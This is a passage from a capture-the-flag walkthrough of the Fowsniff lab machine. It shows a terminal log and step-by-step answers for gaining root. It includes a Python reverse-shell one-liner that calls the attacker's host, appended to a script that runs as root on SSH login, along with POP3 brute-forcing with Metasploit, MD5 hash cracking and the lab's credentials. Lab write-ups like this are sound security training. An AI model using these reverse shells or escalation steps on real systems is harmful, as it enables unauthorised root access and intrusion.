-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions\n\n"

baksteen@fowsniff:/opt/cube$ which python
baksteen@fowsniff:/opt/cube$ which python3
/usr/bin/python3
baksteen@fowsniff:/opt/cube$ nano cube.sh 

add revshell

baksteen@fowsniff:/opt/cube$ cat cube.sh
printf "
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions\n\n"
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.1.77",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

baksteen@fowsniff:/opt/cube$ cd /etc/update-motd.d/
baksteen@fowsniff:/etc/update-motd.d$ ls
00-header  10-help-text  91-release-upgrade  99-esm
baksteen@fowsniff:/etc/update-motd.d$ cat 00-header 
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

#[ -r /etc/lsb-release ] && . /etc/lsb-release

#if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
#       # Fall back to using the very slow lsb_release utility
#       DISTRIB_DESCRIPTION=$(lsb_release -s -d)
#fi

#printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"

sh /opt/cube/cube.sh

exit ssh then login and use nc to get root

baksteen@fowsniff:/etc/update-motd.d$ exit
logout
Connection to 10.10.178.83 closed.

┌──(kali㉿kali)-[~]
└─$ ssh baksteen@10.10.178.83
baksteen@10.10.178.83's password: S1ck3nBluff+secureshell



┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nlvp 1337
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.178.83.
Ncat: Connection from 10.10.178.83:59396.
/bin/sh: 0: can't access tty; job control turned off
# whoami;id;cat /root/flag.txt
root
uid=0(root) gid=0(root) groups=0(root)
   ___                        _        _      _   _             _ 
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
               |___/ 

 (_)
  |--------------
  |&&&&&&&&&&&&&&|
  |    R O O T   |
  |    F L A G   |
  |&&&&&&&&&&&&&&|
  |--------------
  |
  |
  |
  |
  |
  |
 ---

Nice work!

This CTF was built with love in every byte by @berzerk0 on Twitter.

Special thanks to psf, @nbulischeck and the whole Fofao Team.

```



Deploy the machine. On the top right of this you will see a Deploy button. Click on this to deploy the machine into the cloud. Wait a minute for it to become live.



Using nmap, scan this machine. What ports are open?
nmap -A -p- -sV 10.10.178.83




Using the information from the open ports. Look around. What can you find?


Using Google, can you find any public information about them?
There is a pastebin with all of the company employees emails and hashes. If the pastebin is down, check out TheWayBackMachine, or https://github.com/berzerk0/Fowsniff



Can you decode these md5 hashes? You can even use sites like hashkiller to decode them.


Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?
In metasploit there is a packages called: auxiliary/scanner/pop3/pop3_login where you can enter all the usernames and passwords you found to brute force this machines pop3 service.



What was seina's password to the email service?
*scoobydoo2*

Can you connect to the pop3 service with her credentials? What email information can you gather?
Use netcat with the port 110 to view her emails. nc </ip> 110




Looking through her emails, what was a temporary password set for her?
*S1ck3nBluff+secureshell*

In the email, who send it? Using the password from the previous question and the senders username, connect to the machine using SSH.


Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?
cube.sh



Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?

Python Reverse Shell:

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Other reverse shells: here.
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
Use a python reverse shell (make sure it runs as python3)



If you have not found out already, this file is run as root when a user connects to the machine using SSH. We know this as when we first connect we can see we get given a banner (with fowsniff corp). Look in /etc/update-motd.d/ file. If (after we have put our reverse shell in the cube file) we then include this file in the motd.d file, it will run as root and we will get a reverse shell as root!
 Run the cube file to the motd.d file.



Start a netcat listener (nc -lvp 1234) and then re-login to the SSH service. You will then receive a reverse shell on your netcat session as root!


If you are really really stuck, there is a brilliant walkthrough here: https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/ 

If its easier, follow this walkthrough with the deployed machine on the site.



[[CyberHeroes]]